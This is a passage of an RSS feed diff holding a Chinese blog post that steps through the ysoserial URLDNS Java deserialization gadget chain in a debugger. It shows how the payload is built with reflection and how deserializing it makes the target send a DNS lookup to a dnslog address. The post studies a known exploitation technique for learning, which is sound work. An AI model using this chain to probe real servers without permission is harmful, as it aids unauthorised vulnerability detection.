+&lt;p&gt;&lt;img src=&#34;16.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;hash 计算后的对象（就是对象中的 hashCode 变量发生了变化嘛）：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;19.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;进入下一行代码，Reflections.setFieldValue 是什么呢？&lt;/p&gt;
+&lt;p&gt;看名字就是一个通过反射设置成员变量值的功能😀&lt;/p&gt;
+&lt;p&gt;进入函数内部，是要设置传入对象的成员变量 hashCode 的值&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;17.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;查看变量值，传入对象是包含 payload 的 URL 对象，要将它的 hashCode 值设置为 - 1&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;18.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;执行完这行代码，发现变量 u 和 ht 中存储的 URL 对象的 hashCode 值都变为 - 1 了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;20.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后返回 ht，也就是更改过存储 key 的 hashCode 值的 HashMap&lt;/p&gt;
+&lt;p&gt;再次进入 PalodRunner#run，返回的 HashMap 赋值给 objBefore，再将其序列化赋值给 ser&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;21.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Utils.releasePayload (payload, objBefore) 应该是释放资源的代码（不用在意，和最后返回值无关）&lt;/p&gt;
+&lt;p&gt;最后返回 ser，即将 ser 值赋给变量 serialized，所以 serialized 就是序列化后的 payload&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;终于！开始反序列化触发漏洞了！&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;从这里进入反序列化函数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;22.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;代码注释中说明，&lt;strong&gt;利用链从 HashMap#readObject () 进入，直到进入 URL#hashCode () 触发 DNS 请求&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Gadget Chain:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;pre&gt;&lt;code&gt;HashMap.readObject()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;pre&gt;&lt;code&gt;HashMap.putVal()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;pre&gt;&lt;code&gt;HashMap.hash()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;pre&gt;&lt;code&gt;URL.hashCode()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;那我们就一直点点点直接看见 readObject&lt;/p&gt;
+&lt;p&gt;好了过了没看见嘤嘤嘤&lt;/p&gt;
+&lt;p&gt;直接去 Hash#readObject 处下个断点&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;23.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;往下翻翻就会看见一段代码，又看见了熟悉的单词，hash&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;24.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;根据利用链我们可知触发漏洞的 hashCode () 就在 hash () 中，我们进入该函数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;25.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;到达 URL#hashCode，果然其中有 key.hashCode ()&lt;/p&gt;
+&lt;p&gt;因为我们在构造 payload 时将 hashCode 赋值为 - 1，所以不会进入 if 而是执行下面的代码&lt;/p&gt;
+&lt;p&gt;调用 URLStreamHandler#hashCode&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;26.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;进入 URLStreamHandler#hashCode&lt;/p&gt;
+&lt;p&gt;根据 p 神的文章所言，getHostAddress 中有一行代码&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;InetAddress.getByName(host) ;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;其作⽤是根据主机名，获取其 IP 地址，在⽹络上其实就是⼀次 DNS 查询，整个触发过程就已经完成啦&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;27.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;28.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;后面继续跟进就是地址的具体查询过程了，无了无了&lt;/p&gt;
+&lt;p&gt;下图是漏洞触发的调用栈&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;29.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;payload 构造&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;将我们输入的 dns 地址存储在 URL 对象中 -&amp;gt; 将 URL 对象作为 key 存储在 HashMap 中 -&amp;gt; 由于作为 key 值，在 put 时会进行 hash 计算，那我们就通过反射更改其 hashCode 值为 - 1&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞触发&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;反序列化 HashMap 时，会调用 hash () 计算 key 的 hash 值 -&amp;gt; 计算时，调用 (URL 对象) key#hashCode () -&amp;gt; 由于我们将该对象的 hashCode 值设置为 - 1，所以会调用 handler.hashCode () -&amp;gt; 其中获取地址的代码， &lt;code&gt; InetAddress addr = getHostAddress(u);&lt;/code&gt;  实际上就是一次 DNS 查询&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;小彩蛋&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在构造 payload，ht.put () 时，由于 URL 的 hashCode 值为 - 1，所以同样会调用 handler.hashCode () 触发 DNS 查询，可是为什么我们只能获取到一条 dns 查询记录，而不是两条呢？&lt;/p&gt;
+&lt;p&gt;直接在 DNS 查询处下断点&lt;/p&gt;
+&lt;p&gt;生成 payload 时，进入 URLStreamHandler#hashCode 查看当前变量&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;31.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;反序列化时，进入 URLStreamHandler#hashCode 查看当前变量&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;32.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以发现获取到的 addr 有值了，为 &lt;code&gt;域名/127.0.0.1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;那么同样是将 &lt;code&gt;http://ysmzza.dnslog.cn&lt;/code&gt;  传入 &lt;code&gt;getHostAddress(u)&lt;/code&gt;  得到的结果却不一样呢？&lt;/p&gt;
+&lt;p&gt;那么我们再进入 &lt;code&gt;getHostAddress(u)&lt;/code&gt;  进行对比&lt;/p&gt;
+&lt;p&gt;构造 payload 进入 &lt;code&gt;getHostAddress(u)&lt;/code&gt;  时，如下图&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;33.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;34.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里调用的 SilentURLStreamHandler#getHostAddress 直接返回的 null&lt;/p&gt;
+&lt;p&gt;注释:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;这个 URLStreamHandler 实例用于在创建 URL 实例时避免任何 DNS 解析。 DNS 解析用于漏洞检测。重要的是不要在使用序列化对象之前探测给定的 URL。潜在的误报：如果首先从测试计算机解析 DNS 名称，则目标服务器可能会获得缓存击中第二个决议。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;而在我们反序列化后进入 &lt;code&gt;getHostAddress(u)&lt;/code&gt; ，URL 对象中的 handler 就是默认的 handler 了，因而会触发 DNS 查询&lt;/p&gt;
+&lt;p&gt;所以 POC 中定义 URLStreamHandler 内部类，避免生成 paayload 时进行 DNS 解析（其实看注释就能看到，但我一开没有看到这里的代码 (๑・́ωก̀๑)  ）&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;小问题&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;漏洞是通过 URLStreamHandler#hashCode 触发的，那么这个 handler 是啥玩意？&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;new URL 对象时，一定要传入 handler 才能触发漏洞吗？如果不传入 handler，程序还能正常运行吗？（因为 HashMap#put 时会调用 URLStreamHandler#hashCode）会有默认的 handler 给我们调用吗？&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;查查 API&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;抽象类 &lt;code&gt; URLStreamHandler&lt;/code&gt;  是所有流协议处理程序的通用类，流协议处理程序知道如何为特定协议类型建立连接，如 &lt;code&gt;http&lt;/code&gt;  或 &lt;code&gt;https&lt;/code&gt; 。&lt;/p&gt;
+&lt;p&gt;在大多数情况下，  &lt;code&gt;URLStreamHandler&lt;/code&gt;  子类的实例不是由应用程序直接创建的。  更确切地说，在第一时间构建时的协议名称遇到 &lt;code&gt;URL&lt;/code&gt;  ，适当的流协议处理程序被自动加载。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;所以流协议程序用于为协议建立连接，并构建时的协议名称遇见 URL 时，适当的流协议处理程序被自动加载&lt;/p&gt;
+&lt;p&gt;所以其实不传入 handler，URL 对象也会自动加载 handler&lt;/p&gt;
+&lt;p&gt;由小彩蛋的内容可知传入自定义的 handler 只是为了在生成 payload 时不进行 dns 解析&lt;/p&gt;
+&lt;h2 id=&#34;调试遇到的问题未解决&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#调试遇到的问题未解决&#34;&gt;#&lt;/a&gt; 调试遇到的问题（未解决）&lt;/h2&gt;
+&lt;p&gt;在尝试代码调试时，发现无法启用 debug&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;7.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;看第一行，运行的是 jdk8_32，而我的 idea 是 64 位的，估计是不一致导致的问题（以前经常碰见 tomcat 和 jdk 不一致导致的问题）&lt;/p&gt;
+&lt;p&gt;在上方菜单栏 file-&amp;gt;project structure 中可以设置 jdk 版本，更改为 64 位 jdk&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;8.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后就会报错，程序包 sun.rmi.server 不存在&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;9.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;但是在使用 jdk8 运行程序时并没有该错误，ctrl+click 点击进入报错程序包，是可以找到在 java 原生库中的&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;10.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;也就是说在编译程序的 classpath 中没有包含’sun.rmi.server’这个包&lt;/p&gt;
+&lt;p&gt;我的直觉告诉我是版本的问题，可是上图中 jdk11 的包里面也有这个包的并且已经引入项目中了&lt;/p&gt;
+&lt;p&gt;所以我换回 jdk8_32，查看 jar 包的区别&lt;/p&gt;
+&lt;p&gt;jdk8：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;11.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;jdk11:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;12.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;难道这个世界有些东西我真的，难以探寻吗，这真的就是我的极限了吗，不，我要去百度！！百度救我！！！&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;https://xy2401.com/local-docs/oracle/java.zh/11/migrate/#JSMIG-GUID-D7936F0D-08A9-411E-AD2F-E14A38DA56A7&#34;&gt;这里发现&lt;/a&gt;，jdk11 不再提供 corba 工具，rmic (RMI 编辑器) 不再支持 - idl 或 - iiop 选项。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;可是 java11 的 api 里面是有 rmi 的🙁&lt;/p&gt;
+&lt;p&gt;果然换成 jdk8_64 所有问题迎刃而解，那么这个问题…&lt;/p&gt;
+&lt;p&gt;当然不能算解决了，未完待续！&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
